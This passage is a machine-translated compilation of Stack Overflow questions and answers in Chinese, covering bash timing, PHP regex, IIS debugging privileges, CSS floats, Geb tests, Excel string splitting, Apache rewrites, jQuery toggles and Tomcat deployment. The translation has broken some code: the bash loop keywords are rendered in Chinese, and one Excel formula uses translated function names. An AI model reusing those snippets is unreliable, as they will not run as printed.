-- 打印一个数字后跟一个点，然后将下一个参数视为字符串并仅打印前三个字符。

```
$ i=0; 而 [ $i -lt 9 ];do i=$((i+1)); 睡眠 0.1；\
       printf "%d.%.3ss\n" `date +%S` `date +%N` ; 完成
33.917 秒
34.025s
34.133s
34.240 秒
34.348s
34.457 秒
34.566s
34.674s
34.784s

```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-01T13:25:45.067

由于使用`bc`需要时间的隐式分叉，我更喜欢这种**纯 bash**解决方案：

```
start=$(date +%s%N);sleep 1.1;elapsed_time=$(($(date +%s%N) - start))
_Z9=000000000
[ ${#elapsed_time} -lt 9 ] && \
    elapsed_time=${_Z9:0:9-${#elapsed_time}}$elapsed_time;
printf "%.3fs\n" ${elapsed_time:0:${#elapsed_time}-9
     }.${elapsed_time:${#elapsed_time}-9} 
```

打印：

```
1.107s 
```

对于这类事情，我编写了一个小[*bash 源文件*](http://www.f-hauri.ch/vrac/cours_truc-et-astuces_2012-04-03/elap.bash)**，可以快速**完成这项工作。

它在 Linux 上使用`/proc/timer_list`，或者在 Linux上使用，`/proc/uptime`或者`date +%s%n`在其他系统上没有经过很好的测试（欢迎提供反馈；）。

它使用两个计数器（一个用于每次调用，另一个作为整体计数器）并接受一些参数（阅读评论）：

```
. elap.bash
elap -R ; for i in {1..10};do sleep .1; elap Counter $i;done;elap -t total
 0.110488478 Counter 1
 0.111014783 Counter 2
 0.117158015 Counter 3
 0.112897232 Counter 4
 0.111928207 Counter 5
 0.108822248 Counter 6
 0.113464053 Counter 7
 0.117487421 Counter 8
 0.115716626 Counter 9
 0.110493433 Counter 10
 0.008513430      1.137983926 total 
```

而且，`bc`可能有用：

```
time echo 'scale=1000;pi=4*a(1);0'|bc -l 
0

real    0m1.590s
user    0m0.768s
sys     0m0.008s 
```

或者

```
elap -R;elap BC answer is: $(echo 'scale=1000;pi=4*a(1);0'|bc -l )
    1.539957483 BC answer is: 0 
```

使用此脚本`/proc/timer_list`可以执行以下操作：

```
elap -R ; for i in {1..10};do elap Counter $i;done;elap -t total
 0.001299574 Counter 1
 0.001574097 Counter 2
 0.005771637 Counter 3
 0.001428803 Counter 4
 0.010423721 Counter 5
 0.004037965 Counter 6
 0.001392464 Counter 7
 0.008092812 Counter 8
 0.001634280 Counter 9
 0.001365652 Counter 10
 0.008201473      0.045222478 total 
```

虽然相同的脚本*无法访问 /proc*，但使用 fork`date +%s%N`给出：

```
elap -R ; for i in {1..10};do elap Counter $i;done;elap -t total
 0.012148259 Counter 1
 0.013415551 Counter 2
 0.008279329 Counter 3
 0.013700332 Counter 4
 0.012837796 Counter 5
 0.015562929 Counter 6
 0.008062369 Counter 7
 0.016810494 Counter 8
 0.011537439 Counter 9
 0.009731194 Counter 10
 0.012959840      0.135045532 total 
```

我们可以看到*分叉有成本*（在这种情况下接近 1/100 秒）。

好吧，最后，为了**匹配 SO 问题的确切格式，**可以修补这个小脚本，以这种方式作为示例：

```
eval "$(sed -e < elap.bash '
    /6d/{ s/6d.%/10.3f/g;p;N;
        :a;
          s/^.*\n//g;N;s/" \\\n[ \t]*"/./; p;
          s/^.*//g; N;/elaP_elap2/ba; }')"

elap -R ; for i in {1..10};do elap Counter $i;done;elap -t total
     0.001s Counter 1
     0.006s Counter 2
     0.007s Counter 3
     0.004s Counter 4
     0.003s Counter 5
     0.002s Counter 6
     0.001s Counter 7
     0.001s Counter 8
     0.006s Counter 9
     0.002s Counter 10
     0.004s      0.038s total 
```

共 38 秒

# php - PHP 多行 preg_replace 提取 HTML 文档的一部分

> ID：12820885
> 
> 赞同：1
> 
> 时间：2012-10-10T13:46:40.553
> 
> 标签：php, regex, preg-replace

我正在尝试解析 HTTP 文档以提取文档的部分内容，但无法获得所需的结果。这是我得到的：

```
<?php

// a sample of HTTP document that I am trying to parse
$http_response = <<<'EOT'
<dl><dt>Server Version: Apache</dt>
<dt>Server Built: Apr  4 2010 17:19:54
</dt></dl><hr /><dl>
<dt>Current Time: Wednesday, 10-Oct-2012 06:14:05 MST</dt>
</dl>
I do not need anything below this, including this line itself
......
EOT;

echo $http_response;
echo '********************';
$count = -1;
$a = preg_replace("/(Server Version)([\s\S]*?)(MST)/", "$1$2$3", $http_response, -1, $count);
echo "<br> count: $count" . '<br>';
echo $a; 
```

1.  我仍然在输出中看到字符串“我不需要...”。我不需要那个字符串。我究竟做错了什么？
2.  如何轻松删除所有其他 HTML 标记？

谢谢你的帮助。

-阿米特

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:51:47.603

您正在*匹配*从`Server Version`until的所有内容`MST`。并且只有匹配的部分稍后会被 preg_replace 修改。正则表达式未涵盖的所有内容都保持不变。

因此，要替换第一个锚点之前的字符串部分以及后面的文本，您还必须先*匹配*它们。

```
= preg_replace("/^.*(Server Version)(.*?)(MST).*$/s", "$1$2$3", 
```

见`^.*`和`.*$`。两者都将匹配，但在替换模式中未提及；所以他们被丢弃了。

当然，在这种情况下使用可能更简单[`preg_match()`](http://php.net/preg_match)......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:53:18.527

您需要在正则表达式之后/之前捕获其他字符，例如：

```
/.+?(Server Version)([\s\S]*?)(MST).+?/s 
```

's' 是一个标志，告诉 preg 匹配多行，你需要它。

要删除 html 标签，请使用 strip_tags。

# visual-studio-2010 - 为什么 IIS 应用程序需要提升权限才能附加？

> ID：12820888
> 
> 赞同：3
> 
> 时间：2012-10-10T13:46:48.680
> 
> 标签：visual-studio-2010, iis

我有这个确切的问题：

[Visual Studio 需要在 Windows 7 中提升权限](https://stackoverflow.com/questions/2745085/visual-studio-requires-elevated-permissions-in-windows-7)

但是我对那里的任何答案都不满意，所以我想知道是否有人可以扩展替代解决方案。

# 设置

*   开发盒正在运行服务器 2008
*   视觉工作室 2010
*   IIS 7

为了附加到在 IIS 下运行的进程，我被告知我需要以管理员身份运行 Visual Studio。如果我这样做，每当我编辑一个文件并将其签入源代码控制时，其他用户（不是管理员）就无法编辑该文件，因为该文件现在需要提升的权限才能编辑！引起巨大的头痛，因此基本上以管理员身份运行 VS 似乎不是一种选择。

有没有人有其他选择？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T14:33:50.107

附加到在不同用户凭据或更高完整性级别下运行的进程需要 SE_DEBUG 权限，应用程序在以管理员身份运行时获得该权限。您的 IIS AppPool 很可能未配置为在您的帐户下运行，因此需要提升权限。

从 Windows Vista 开始，SE_DEBUG 特权对于不以管理员身份运行（或更准确地说，不以高完整性级别运行）的进程禁用。

来自[MSDN](http://msdn.microsoft.com/en-us/library/bb625963.aspx)：

> 某些管理 Windows 权限只能分配给至少具有高完整性级别的访问令牌。如果访问令牌完整性级别低于高，则不允许特定的管理权限并将其从访问令牌中删除。与高完整性级别相关的管理权限是：
> 
> ...
> 
> SE_DEBUG_PRIVILEGE
> ...

从[这里开始](http://msdn.microsoft.com/en-us/library/windows/desktop/ee695867%28v=vs.85%29.aspx)：

> SeDebugPrivilege - 需要调试和调整另一个帐户拥有的进程的内存。用户权利：调试程序。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-03-19T11:24:13.720

在这里游戏有点晚了，但我发现如果你安装[了 Visual Studio 的远程工具](http://www.microsoft.com/en-gb/download/details.aspx?id=40781)并在本地安装它，你就可以附加到`w3wp.exe`而不必在提升的权限下运行！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-10T14:30:51.527

如果您转到网站项目的属性，然后单击“网络”选项卡，然后选择“使用本地 iis Web 服务器”选项，您就可以“正常”调试。这对我们有用，无需提升权限。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-08-26T23:27:43.087

> 给予这个特权
> 
> 1) 从命令提示符运行 GPEDIT.MSC。
> 
> 2) 导航到
> 
> 本地计算机策略 -> 计算机配置 -> Windows 设置 -> 安全设置 -> 本地策略 -> 用户权限分配 -> 调试程序并添加用户。*
> 
> *你也应该知道如果你授予某人 SeDebugPrivilege，你放弃了农场

[http://social.msdn.microsoft.com/Forums/en-US/0f394922-4d3d-4c00-8bc1-88aeeeedd843/how-to-add-a-user-to-debug-users-group?forum=netfxbcl](http://social.msdn.microsoft.com/Forums/en-US/0f394922-4d3d-4c00-8bc1-88aeeeedd843/how-to-add-a-user-to-debug-users-group?forum=netfxbcl)

**更新**：

这也行不通。

另一种方法是，如“Professional Visual Basic 2012 and .NET 4.5 Programming”一书中所述：转到 bin/debug 文件夹并在调试器之外手动启动 ProVB2012_Security.exe 可执行文件。但无论哪种情况，您现在都应该被提示授予管理员权限...

# html - 使用浮动的侧边栏与使用浮动+清除的内容冲突

> ID：12820889
> 
> 赞同：1
> 
> 时间：2012-10-10T13:46:49.347
> 
> 标签：html, css-float

我有一个使用右侧边栏的网站。该侧边栏使用“float:right”作为其 CSS 样式。

我喜欢将内容添加到在图像周围浮动的主要内容，作为解释。对于这些图像，我也使用“float:right”，它按预期工作。

当我添加几个带有图像的文本部分时，挑战就开始了，如下所示：

```
1st text   +-----+
text text  | img |
           +-----+

2nd text   +-----+
text text  | img |
           +-----+ 
```

默认情况下，第二段将在第一段结束后立即开始，如下所示：

```
1st text   +-----+
text text  | img |
2nd text   +-----+
text text
           +-----+
           | img |
           +-----+ 
```

我了解到我应该在段落之间使用 clear:right 样式以将它们分开，并且按照描述的方式工作。

这是我用于每个 img+text 块的代码：

```
<div>
<img style="float:right" src="animg.png" width="502" height="241" alt="bla bla">
<p>Text for the image.</p>
<div style="clear:right"></div>
</div> 
```

但是，现在侧边栏开始出现问题：如果侧边栏下降得比左侧出现的 clear:right 更远，那么内容中就会出现间隙，一直到侧边栏为止。你可以在这里看到效果：[带有侧边栏影响的网站示例 clear:right](http://apps.tempel.org/FindAnyFile/manual.php)

有什么建议可以解决这个问题，即避免 clear:right 不会受到侧边栏高度的影响，而只会受到本地文本+图像块的影响？

到目前为止，我发现的一个建议是避免在侧边栏使用浮动，而是使用表格。但这会导致新的复杂性（例如，除非我更改 html 内容的顺序，否则侧边栏最终会出现在左侧，这可能会导致屏幕较小的新问题等等）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T14:48:58.990

您的内容区域和侧边栏需要位于不同的`div`标签中：

```
<body>
    <div>Header</div>
    <div>Content</div>
    <div>Sidebar</div>
</body> 
```

将内容向左浮动，侧边栏向右浮动。然后，您可以根据需要在每个部分中添加任意数量的元素。只要 HTML 格式正确（即在需要时不丢失结束标记）并且它们都保持在其父级的宽度内，它们就不会有问题。

编辑：

使用静态侧边栏和流体（弹性）主区域，它会变得更复杂一些。首先，从 中删除右侧边距`#main`，然后添加：

```
overflow-y: hidden; 
```

然后，将`margin-right`您的`boxes`div 上的更改为：

```
margin: 0 2em; 
```

那应该为您解决问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-02T15:23:47.003

享受代码。

HTML：

```
<div class="main">
    <div class="box-one">Your content here</div>
    <div class="box-two">Put photo here</div>
    <div class="clear"></div> 
```

CSS：

```
.clear{
    clear:both;
}
.main{
    width:100%;
    background:#424242;
  padding-top:5px;
  padding-bottom:5px;
  padding-left:5px;
  padding-right:5px;
}

.box-one{
    width:260px;
    background:#FFF;
    float:left;

}
.box-two{
    width:100px;
    background:#FFF;
    float:right;

} 
```

# grails - 在 Grails 应用程序中使用 Spring Security 插件进行功能测试

> ID：12820895
> 
> 赞同：3
> 
> 时间：2012-10-10T13:47:12.207
> 
> 标签：grails, spring-security, junit4, functional-testing, geb

我有一个带有 spring 安全插件的安全 grails 应用程序，现在我正在尝试对登录过程进行一些测试，但到目前为止还没有成功。有人知道问题出在哪里吗？

这是我的 LoginPage.groovy

```
package pages.login

import geb.Page

class LoginPage extends Page {
    static url = "login/auth"

    static at = {
        title ==~ /Login/
    }

    static content = {
        loginForm { $("form") }
        username { $("input", type:"text", name:"j_username") }
        password { $("input", type:"password", name:"j_password") }
        loginButton{ $("input", type:"submit", value:"Login") }
    }
} 
```

这是使用junit4的测试：

```
import geb.junit4.GebReportingTest

import pages.copyright.*
import pages.login.LoginPage
import org.junit.Test

class CopyrightCRUDTests extends GebReportingTest {

    @Test
    void doSomeCrud() {

        to LoginPage
        at LoginPage
        $("form").j_username() << "admin"
        $("form").j_password() << "XXXXX"
        loginButton.click()

        to AuthenticatedPage
        at AuthenticatedPage

    }
} 
```

AuthenticatedPage 是需要身份验证的页面，但此时无法使用 geb 进行身份验证。有人知道这个问题吗？

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T08:44:39.413

尝试重写`doSomeCrud()`如下：

```
to LoginPage
loginForm.j_username = 'admin'
loginForm.j_password = 'XXXXX'
loginButton.click()
waitFor { at AuthenticatedPage } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-28T05:25:09.690

我不知道这是否会对您有所帮助，因为您没有使用 Spock，但我在登录时也遇到了一些问题（虽然不记得到底是什么）

我最终找到了我放入扩展 GebSpec 的规范中的这段代码。

这在每个需要登录的测试之前被调用：

```
 def setupSpec() {
    Browser.drive {
      go baseUrl
        $("form.login").with {
          username = System.getenv("APP_USERNAME")
          password = System.getenv("APP_PASSWORD")
        }
        $("input[name='submit']").click()
      }
  } 
```

看起来不多，但在表单上使用“with”对我有用。

# regex - VB6 和 C# 正则表达式

> ID：12820896
> 
> 赞同：4
> 
> 时间：2012-10-10T13:47:18.697
> 
> 标签：regex, c#-4.0, vb6, vb6-migration

我需要将一个 VB6（我不熟悉）项目转换为 C# 4.0 项目。该项目包含一些用于字符串验证的正则表达式。

我需要知道正则表达式在两种情况下的行为是否相同，所以如果我只是将正则表达式字符串从 VB6 项目复制到 C# 项目，它们的工作方式是否相同？

我对正则表达式有基本的了解，我几乎可以阅读一个正则表达式的功能，但是对于口味等，目前这有点超出我的想象。

例如，这 2 行是否等效？

VB6：

```
isStringValid = (str Like "*[!0-9A-Z]*") 
```

C＃：

```
isStringValid = Regex.IsMatch(str, "*[!0-9A-Z]*"); 
```

谢谢！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-10-10T14:00:43.020

旧的 VB`Like`操作符，尽管看起来，并不是一个正则表达式接口。它更像是一个全局模式匹配器。请参阅[http://msdn.microsoft.com/en-us/library/swf8kaxw.aspx](http://msdn.microsoft.com/en-us/library/swf8kaxw.aspx)

在您的示例中：

```
Like "*[!0-9A-Z]*" 
```

匹配以任何字符（零个或多个）开头和结尾的字符串，然后*不*匹配中间某处的字母数字字符。正则表达式为：

```
/.*[^0-9A-Z].*/ 
```

* * *

**编辑**回答您的问题：不，两者不能互换使用。`Like`但是，将' 的操作数转换为适当的正则表达式相当容易：

```
Like       RegEx
========== ==========
?          .
*          .*
#          \d
[abc0-9]   [abc0-9]
[!abc0-9]  [^abc0-9] 
```

对此有一些警告，但这应该可以帮助您入门并涵盖大多数情况。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-10-10T13:59:58.440

一句话，是的。

这些都是一样的。一些快速的谷歌搜索应该可以为您提供更复杂问题的答案。

[http://social.msdn.microsoft.com/Forums/en-US/csharpgeneral/thread/bce145b8-95d4-4be4-8b07-e8adee7286f1/](http://social.msdn.microsoft.com/Forums/en-US/csharpgeneral/thread/bce145b8-95d4-4be4-8b07-e8adee7286f1/)

[http://www.regular-expressions.info/dotnet.html](http://www.regular-expressions.info/dotnet.html)

# javascript - 如何在for循环中添加DOM元素

> ID：12820897
> 
> 赞同：1
> 
> 时间：2012-10-10T13:47:18.400
> 
> 标签：javascript, dom

每次增加 (i) 时如何创建新元素：

```
for(int i = 0; i < 10; i++)
{
    Element child = doc.createElement("xxx");
    root.setAttribute("x", i * "xx");
    doc.appendChild(child);
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T13:57:57.740

使用纯js

```
var div = document.getElementById("main");

for (var i = 0; i < 10; i++) {
  var span = document.createElement("span");
  span.setAttribute("class", "new");
  span.innerHTML = "span" + i;
  div.appendChild(span);
}​ 
```

HTML

```
​&lt;div id="main"></div>​​​​​​​ 
```

工作[示例](http://jsfiddle.net/eNBpB/)。

干杯！！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T14:04:38.617

使用 java

```
 Element child = null;        

    for(int i = 0; i < 10; i++)
    {
      child = doc.createElement("xxx" + i);//you can write a method with int parameter to get element name from somewhere else 

      doc.appendChild(child);
    } 
```

我希望这是你想要的，顺便说一下你应该使用的文本节点`doc.createTextNode("A")`

# android - 同步安卓和PC的系统时钟

> ID：12820899
> 
> 赞同：3
> 
> 时间：2012-10-10T13:47:20.723
> 
> 标签：android, tcp, synchronization

我有一个通过 TCP 套接字发送到另一部 Android 手机或 PC 的 Android 应用程序，我想同步发送方和接收方时钟的时钟。我已经在 android 上尝试过 SystemClock.setCurrentTimeMillis，但即使使用权限 android.permission.SET_TIME 也无法正常工作。还有其他方法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-10T13:53:23.763

不幸的是，您无法通过代码更改您的 android 手机的时间，因为您没有设置 android.permission.SET_TIME 的权限。您只能在有根手机上执行此操作。

那么，为什么不让您的两个应用程序从受信任的来源（如[internet time](http://www.timeanddate.com/time/internettime.html) ）更新。也许使用[android sntp 客户端](http://hi-android.info/src/android/net/SntpClient.java.html)

```
 //Sample usage:
 SntpClient client = new SntpClient();
 if (client.requestTime("time.nist.gov")) {
    long now = client.getNtpTime() + SystemClock.elapsedRealtime() -    client.getNtpTimeReference();
  } 
```

或者你可以做的是：通过你用来接收数据的程序将你手机上的当前时间发送到电脑并设置你电脑的时间。也看看这里：[设置移动时间和日期](https://stackoverflow.com/questions/1332269/how-to-set-mobile-system-time-and-date-in-android)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T14:06:28.850

我不知道你的应用程序，但是，像这样同步时钟似乎有点小补丁。我建议您使用 NTP（网络时间协议）来这样做。Android 以及 Windows、MAC 和 Linux 机器都可以做到这一点。您的 android 机器将通过手机信号塔或 WIFI 执行此操作。我最近为 Android 移植了一个蜂窝调制解调器，我广泛查看了日志，我可以告诉你，时间同步经常发生，每次网络连接时，一天几次。即使在切换网络源（手机或wifi）时也非常准确。这很简单，您不必编写任何代码，只需对其进行配置即可启用它。

结果是从官方网络来源设置的PC和Android时间。

# excel - 使用 Excel 拆分字符串

> ID：12820908
> 
> 赞同：10
> 
> 时间：2012-10-10T13:47:49.100
> 
> 标签：excel, split

我有一个格式如下的字符串：

```
StockCode Country Date Price equity 
```

例如：

*   `1 hk 10/31/12 C70.5 equity`
*   `101 hk 11/21/13 P63 equity`
*   `388 hk 10/17/12 P100 equity`

我可以通过这个 Excel 命令提取日期：

```
LEFT(RIGHT(RIGHT(LEFT(A1,LEN(A1)-7),LEN(LEFT(A1,LEN(A1)-7))-FIND(" ",A1)),
LEN(RIGHT(LEFT(A1,LEN(A1)-7),LEN(LEFT(A1,LEN(A1)-7))-FIND(" ",A1)))-FIND(" ",
RIGHT(LEFT(A1,LEN(A1)-7),LEN(LEFT(A1,LEN(A1)-7))-FIND(" ",A1)))),FIND(" ",
RIGHT(RIGHT(LEFT(A1,LEN(A1)-7),LEN(LEFT(A1,LEN(A1)-7))-FIND(" ",A1)),
LEN(RIGHT(LEFT(A1,LEN(A1)-7),LEN(LEFT(A1,LEN(A1)-7))-FIND(" ",A1)))-FIND(" ",
RIGHT(LEFT(A1,LEN(A1)-7),LEN(LEFT(A1,LEN(A1)-7))-FIND(" ",A1)))))) 
```

（为了可读性而换行）

结果：`10/31/12`

有人对此有更好的解决方案吗？

这是我的一些代码：

*   如何获得“C”和“P”：

    ```
    TRIM(MID(A1,IFERROR(FIND("P",A1),FIND("C",A1)),1)) 
    ```

*   如何获得行使价：

    ```
    TRIM(SUBSTITUTE(RIGHT(A1,LEN(A1)-IFERROR(FIND("P",A1),
    FIND("C",A1))),"equity","")) 
    ```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-10-10T13:58:07.613

试试这个，我认为它应该适用于所有具有 2 个字符年份的日期：

```
=TRIM(MID(A1,FIND("/",A1)-2,8)) 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-10T14:12:50.240

我建议从“数据”选项卡运行“文本到列”。选择 Delimited，并指定空格作为分隔符。这会将您的字符串分成五列，第三列是日期，然后您可以直接自由使用数据。

否则，我会查看 Lajos Example:( `=TRIM(MID(A1,FIND("!^!",SUBSTITUTE(A1," ","!^!",2)),8))`) 或 John 的答案。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-10-10T18:05:23.220

如果您可以使用宏 UDF，这很简单。

```
Function STR_SPLIT(str as String, sep as String, n as Long)
    Dim Arr() as String
    Arr = Split(str, sep)
    STR_SPLIT = Arr(n - 1)
End Function 
```

str 是要拆分的字符串， sep 是要拆分的字符-在您的情况下为“”-n是您要查找的列号。例如， =STR_SPLIT(A1," ",3) 将返回日期。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-04-05T13:47:58.007

您可以通过转到数据 > 文本到列并使用空格作为分隔符将每个部分拆分为 Excel 中的列。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-10-10T13:57:08.133

在所有示例中，您的日期都在第二个和第三个空格之间。您可以将第三个空格替换为“！^！” 例如，然后获取子字符串，直到第一次出现“！^！”。之后，您只需要在第二个空格之后提取子字符串。[请在这里](http://www.excelfunctions.net/split-string-in-excel.html)阅读更多内容。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-10-10T14:27:22.297

这个公式也应该给出所需的结果，即使年份有 4 个字符

`=TRIM(MID(SUBSTITUTE(A1," ",REPT(" ",99)),198,99))`

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-10-10T14:28:14.990

谢谢约翰

这是我的一些代码：

如何获得“C”和“P”：

TRIM（MID（A1，IFERROR（查找（“P”，A1），查找（“C”，A1）），1））

如何获得行使价：

修剪（替代（右（A1，LEN（A1）-IFERROR（查找（“P”，A1），查找（“C”，A1））），“股权”，“”））

# apache - Apache 2.2 mod 重写循环。如何替换 [完]

> ID：12820910
> 
> 赞同：1
> 
> 时间：2012-10-10T13:47:52.933
> 
> 标签：apache, mod-rewrite, apache2.2

重写引擎开启

我有以下代码：

```
RewriteCond %{REQUEST_URL} ^$
RewriteRule ^files/(.*)$ getfile.php?file=$1 [L]

RewriteRule  ^(.+)/index([0-9]*).html$ index.php?path=$1/&page=$2 [QSA]
RewriteRule  ^(.+).html$ index.php?path=$1.html [QSA]
RewriteRule  ^(.+)/(.+).htm$ index.php?path=$1/&article=$2.htm [QSA]
RewriteRule  ^(.+/)$ index.php?path=$1 [QSA]

RewriteRule  ^(.+)$ index.php?path=$1 [QSA] 
```

此代码根据情况将 urls 转换为参数路径和文章。所有好的和坏的 url 请求都被路由到 index.php，文件夹 files/ 中的文件除外。

我对最后一行代码有疑问。它主要用于所有错误的 url（所有其他的都在前面处理过）。有了这个规则，它开始一遍又一遍地循环，因为所有的 url 都符合这个规则。该规则必须匹配一次或从不匹配，但没有 [END] 我无法设计。我有旧版本的 apache (2.2)，所以我不能使用这个方向。

我尝试过的解决方案是这样的：

```
RewriteCond  %{QUERY_STRING} !^.*path=([^&]*).*$
RewriteCond %{REQUEST_URI} !^/((files|design)/.+)$
RewriteRule  ^(.+)$ index.php?path=$1 [QSA] 
```

但不能成功。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T15:40:57.063

尝试`L`在每个规则的末尾添加一个标志，并在开头添加一个重定向环境检查，以通过任何以前内部重定向的 URI：

```
RewriteCond %{ENV:REDIRECT_STATUS} 200
RewriteRule ^ - [L]

RewriteRule ^files/(.*)$ getfile.php?file=$1 [L]

RewriteRule  ^(.+)/index([0-9]*).html$ index.php?path=$1/&page=$2 [L,QSA]
RewriteRule  ^(.+).html$ index.php?path=$1.html [L,QSA]
RewriteRule  ^(.+)/(.+).htm$ index.php?path=$1/&article=$2.htm [L,QSA]
RewriteRule  ^(.+/)$ index.php?path=$1 [L,QSA]

RewriteRule  ^(.+)$ index.php?path=$1 [L,QSA] 
```

# javascript - “更多/更少”切换内容

> ID：12820913
> 
> 赞同：2
> 
> 时间：2012-10-10T13:47:58.063
> 
> 标签：javascript, toggle

所以我在这里有一个经典的“更多/更少”段落：

[http://jsfiddle.net/dVFaV/38/](http://jsfiddle.net/dVFaV/38/)

当我点击“更多信息”时，链接会显示一些内容，同时它会切换到“更少信息”，但我只希望一次只在一个链接上发生这种情况，因为我的页面上会有更多段落。现在，当我单击“更多信息”链接时，另一个链接也会切换，这是我试图避免的。

任何帮助表示赞赏！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T14:00:03.680

如果你的 HTML 结构保持这样，你可以简单地使用：

```
function togglePanel() {
    var $this = $(this);
    if ($this.hasClass('button_open')) 
      $this.parent().next().slideDown('slow');
    else 
      $this.parent().next().slideUp('slow');

    $this.hide().siblings().show();
}

$('.adv-toggle-buttons > a').click(togglePanel); 
```

[http://jsfiddle.net/WFC7s/](http://jsfiddle.net/WFC7s/)

**编辑**：或者像*Bondye*在他的回答中所说的那样，使用 slideToggle ：

```
function togglePanel() {
    var $this = $(this);
    $this.parent().next().slideToggle('slow');
    $this.hide().siblings().show();
}

$('.adv-toggle-buttons > a').click(togglePanel); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-10T14:08:54.697

为什么不使用[toggle()](http://api.jquery.com/toggle/)和[slideToggle()](http://api.jquery.com/slideToggle/)？

## HTML

```
<p class="adv-toggle-buttons">
    <a href="#">[+] More info</a>
    <a href="#" style="display: none;">[-] Less info</a>
</p>
<div class="adv-unit-options" style="display: none;">Lorem ipsum</div>

<p class="adv-toggle-buttons">             
    <a href="#">[+] More info</a>
    <a href="#" style="display: none;">[-] Less info</a>
</p>
<div class="adv-unit-options" style="display: none;">Lorem ipsum</div> 
```

## jQuery

```
$('.adv-toggle-buttons a').each(function() { 
    $(this).on('click', function(){
        $(this).parent().next().slideToggle();
        $(this).parent().find('a').each(function(){
            $(this).toggle();

        });
    });   
}); 
```

​</p>

## 小提琴

[http://jsfiddle.net/dVFaV/40/](http://jsfiddle.net/dVFaV/40/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-01-05T22:06:22.943

使用上述内容，您必须为内容保留 2 个容器。一种用于较短的“更少”版本，一种用于较长的“更多”版本。我喜欢让我的内容尽可能容易更新，实际上我遇到了一种情况，我只能在内容中添加 JS 以调整 dom。我最终使用了相同的内容，只是在剪切之前将其分解为文本。这可以防止您剪切任何 HTML 标记并弄乱内容。

您的 HTML 将类似于：

```
<div class="entry-content">
    <div class="event-detail">
        <div class="bio">
            <p><h2>Lorem 1</h2> ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>
        </div>
    </div>

    <div class="event-detail">
        <div class="bio">
            <p><h2>Lorem 2</h2> ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>
        </div>
    </div>
    </div> 
```

JS 将查找每个 bio 并添加更多/更少按钮，并将副本截断为适用于您的布局的设定值。JS应该是：

```
$(document).ready(function(){
    var num_of_bios = $('.entry-content .bio').length;
    for (i = 0; i < num_of_bios; i++) {
        bio_more = $('.bio:eq('+i+')').html();
        bio_less = $('.bio:eq('+i+')').text();
        bio_less = bio_less.substring(0,200);
        $('.bio:eq('+i+')').html(bio_less+' ... ');
        $('.bio:eq('+i+')').addClass('bio_less bio_'+i);
        $('.bio:eq('+i+')').parent().append('<div class="bio_more bio_'+i+'">'+bio_more+'</div>');
        $('.bio_more').hide();
        $('.bio:eq('+i+')').parent().append('<div class="bio_more_less" name="bio_'+i+'">more</div>');
    }
    $('.bio_more_less').click(function(){
        show_me = $(this).text();
        bio_name = $(this).attr('name');
        if( show_me === 'more'){
            $('.bio_less.'+bio_name).hide();
            $('.bio_more.'+bio_name).show();
            $(this).text('less');
        }
        else if( show_me === 'less'){
            $('.bio_less.'+bio_name).show();
            $('.bio_more.'+bio_name).hide();
            $(this).text('more');
        }
    });

    }); 
```

这是一个小提琴。 [http://jsfiddle.net/jaredlyvers/pezw77bk/10/](http://jsfiddle.net/jaredlyvers/pezw77bk/10/)

# java - 失败 - Tomcat Manager 6 无法启动上下文路径 /App 处的应用程序

> ID：12820921
> 
> 赞同：2
> 
> 时间：2012-10-10T13:48:16.507
> 
> 标签：java, linux, deployment, tomcat6, catalina.out

我试图通过tomcat manager 6部署war文件。一旦部署，总是会出现相同的错误：FAIL - Application at context path / App could not be started

war 文件位于 apache-tomcat-6.0.0/webapps 文件夹下。

我在谷歌上搜索并尝试了不同的选项，例如：

删除 apache-tomcat-6.0.0/work/Catalina/localhost 文件夹以及 apache-tomcat-6.0.0/webapps/App 重新启动服务器并重新部署。

正如我在 catalinalog 文件中看到的那样：

```
INFO: Deploying web application archive App.war
 3:32:47 PM org.apache.catalina.core.StandardContext start
SEVERE: Error listenerStart
 2012 3:32:47 PM org.apache.catalina.core.StandardContext start
SEVERE: Context [/App] startup failed due to previous errors
 2012 3:32:50 PM org.apache.catalina.core.StandardContext start
SEVERE: Error listenerStart
